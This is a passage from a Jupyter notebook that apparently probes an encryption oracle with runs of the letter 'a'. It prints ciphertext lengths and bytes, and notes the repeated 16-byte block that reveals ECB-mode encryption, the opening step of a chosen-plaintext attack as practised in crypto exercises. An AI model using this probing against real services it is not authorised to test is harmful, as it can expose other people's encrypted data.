      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 172 240\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 188 256\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 204 272\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 220 288\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 236 304\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 252 320\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 268 336\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 284 352\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 300 368\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 316 384\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n"
     ]
    }
   ],
   "source": [
    "for query, urlList in test.items():\n",
    "    print(f'{query}: {len(query)} {len(urlList[2])}')\n",
    "    print(f'{urlList[2]}')\n",
    "    # print(f'{query}: {base64.b64decode(url)}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "48"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"\"\"\n",
    "a * 16 : \\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\n",
    "\"\"\"\n",
